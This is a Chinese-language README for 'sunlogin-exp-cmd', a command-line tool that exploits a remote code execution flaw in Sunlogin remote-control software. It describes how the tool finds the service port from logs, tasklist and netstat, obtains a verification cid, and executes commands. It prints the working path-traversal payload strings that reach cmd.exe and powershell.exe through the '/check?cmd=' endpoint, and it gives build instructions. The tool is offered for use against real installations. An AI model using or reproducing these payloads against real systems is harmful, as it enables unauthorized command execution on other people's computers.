# sunlogin-exp-cmd：命令行版向日葵RCE漏洞利用工具


GUI版本：[https://github.com/theLSA/sunlogin-exp-gui](https://github.com/theLSA/sunlogin-exp-gui)



## 0x00 功能介绍

使用帮助：

![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-00.png)

LPE模式：

获取端口方式的顺序：

1.默认日志路径1："C:/ProgramData/Oray/SunloginClient/log/"

2.默认日志路径2："C:/Program Files/Oray/SunLogin/SunloginClient/"

3.自定义的日志路径：搜索c盘查找日志文件"for /r C:/ %i in (sunlogin_service.*.log) do @echo %i"

4.tasklist查找SunloginClient进程

5.tasklist查找SunloginService进程

接着执行命令：先用cmd.exe，若失败则用powershell.exe。

string rceFormatString = "/check?cmd=ping..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\\\system32\\\\cmd.exe /c %s";

string rceFormat1String = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe %s";

![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-01.png)

RCE模式：

先用cmd.exe，若失败则用powershell.exe，须指定IP:PORT。

![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-02.png)



## 0x01 开发细节

环境配置：codeblocks20.03+gcc8.1.0+win7

使用的第三方库：

https://github.com/yhirose/cpp-httplib

先配置好codeblock和gcc环境

1.勾选gcc11+

![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-03.png)

2.链接上libwsock32.a，加上-lws2_32 flag

![](https://github.com/theLSA/sunlogin-exp-cmd/raw/master/demo/sunlogin-exp-cmd-04.png)

3.将httplib.h复制到CodeBlocks\MinGW\lib\gcc\x86_64-w64-mingw32\8.1.0\include\c++目录。


### 找端口

日志文件：

先用默认日志位置"C:\ProgramData\Oray\SunloginClient\log" or "C:\Program Files\Oray\SunLogin\SunloginClient"

如果该日志文件夹存在，则获取其中最晚创建的log文件，利用正则匹配出里面的端口。

不存在则循环for找log关键字，利用正则找到最晚创建的log文件并匹配端口。

若日志文件都找不到，则用命令行tasklist+findstr+netstat，先找SunloginClient进程，没有再找SunloginService进程。

利用正则先匹配出sunlogin进程的pid，再利用pid正则匹配出端口。


### 漏洞检测

lpe模式：

找到端口后，用get_verify_string()获取cid，再调用rce_by_check()执行命令。

rce模式：

若找端口失败，可用rce模式，直接（127.0.0.1）指定端口。



## 0x02 TODO

1.优化执行流程。

2.解决warning。

3.完善变量/函数命名，使其更直观。



## 0x03 反馈

[issues](https://github.com/theLSA/sunlogin-exp-cmd/issues)

